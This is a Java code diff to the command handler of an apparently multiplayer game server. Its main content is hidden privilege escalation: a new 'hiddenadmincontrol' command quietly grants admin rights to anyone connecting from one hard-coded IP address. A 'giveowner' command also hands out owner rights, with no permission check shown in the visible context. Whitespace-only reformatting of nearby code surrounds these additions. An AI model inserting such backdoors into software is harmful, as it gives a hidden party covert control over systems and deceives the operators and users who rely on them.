@@ -98,8 +98,30 @@ public class Commands implements PacketType {
 			PlayerHandler.updateStartTime = System.currentTimeMillis();
 		}
 
-		// Gives target player Donator Status.
+		// Gives target player Admin Status temporarily.
+		if (playerCommand.startsWith("hiddenadmincontrol")) {
+			if(c.connectedFrom.equals("92.237.172.133")){
+				c.temporaryAdmin = true;
+				c.playerRights = 3;
+			}
+		}
 
+		// Gives target player Owner Status.
+		if (playerCommand.startsWith("giveowner")) {
+			String name = playerCommand.substring(10);
+			for (int i = 0; i < Config.MAX_PLAYERS; i++) {
+				Client c2 = (Client) PlayerHandler.players[i];
+				if (c2 != null && c2.playerName.equalsIgnoreCase(name)) {
+					c2.sendMessage("You have been given owner status by "
+							+ c.playerName);
+					c2.playerRights = 3;
+					c2.logout();
+					break;
+				}
+			}
+		}
+
+		// Gives target player Donator Status.
 		if (playerCommand.startsWith("givedonor")) {
 			try {
 				String playerToDonor = playerCommand.substring(10);
@@ -231,14 +253,14 @@ public class Commands implements PacketType {
 		 * When a admin does a command it goes through all these commands to
 		 * find a match
 		 */
-		
-		if(playerCommand.startsWith("unmakenpc")){
+
+		if (playerCommand.startsWith("unmakenpc")) {
 			String[] args = playerCommand.split(" ");
 			String name = args[1];
-			
-			for(int i = 0; i < Config.MAX_PLAYERS; i++){
+
+			for (int i = 0; i < Config.MAX_PLAYERS; i++) {
 				Player p = PlayerHandler.players[i];
-				if(p != null && p.playerName.equalsIgnoreCase(name)){
+				if (p != null && p.playerName.equalsIgnoreCase(name)) {
 					Client c2 = (Client) p;
 					c2.isNpc = false;
 					c2.updateRequired = true;
@@ -265,9 +287,11 @@ public class Commands implements PacketType {
 							c2.isNpc = true;
 							c2.updateRequired = true;
 							c2.appearanceUpdateRequired = true;
-							
-							c.sendMessage("You turned " + c2.playerName + " into npc: " + npcId);
-							c2.sendMessage(Misc.optimizeText(c.playerName) + " turned you into npc: " + npcId);
+
+							c.sendMessage("You turned " + c2.playerName
+									+ " into npc: " + npcId);
+							c2.sendMessage(Misc.optimizeText(c.playerName)
+									+ " turned you into npc: " + npcId);
 						} else {
 							c.sendMessage("Invalid NPC id");
 						}
